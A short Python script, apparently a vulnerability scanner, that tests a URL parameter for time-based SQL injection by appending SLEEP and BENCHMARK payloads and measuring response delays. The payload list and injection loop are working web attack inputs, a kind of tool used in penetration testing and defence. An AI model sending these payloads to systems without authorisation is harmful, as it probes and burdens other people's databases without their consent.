import time
import urllib.parse
import urllib.request

# Simple time-based SQL injection detection
PAYLOADS = [
    "' OR SLEEP(5)-- ",
    '" OR SLEEP(5)-- ',
    "' OR BENCHMARK(1000000,MD5(1))-- ",
    '" OR BENCHMARK(1000000,MD5(1))-- ',
]


def fetch(url: str):
    """Fetch a URL and measure the response time."""
    start = time.time()
    with urllib.request.urlopen(url) as resp:
        body = resp.read().decode('utf-8', errors='replace')
    elapsed = time.time() - start
    return body, elapsed


def test_parameter(url: str, param: str, value: str, delay_threshold: float = 5.0):
    """Attempt time-based SQL injection on a parameter."""
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    original = query.get(param, [''])[0]

    try:
        _, baseline_time = fetch(url)
    except Exception:
        baseline_time = 0.0

    results = []
    for payload in PAYLOADS:
        query[param] = original + payload
        new_query = urllib.parse.urlencode(query, doseq=True)
        new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        try:
            _, elapsed = fetch(new_url)
        except Exception:
            elapsed = 0.0
        vulnerable = (elapsed - baseline_time) > delay_threshold
        results.append({
            'url': new_url,
            'param': param,
            'payload': payload,
            'vulnerable': vulnerable,
        })
    return results
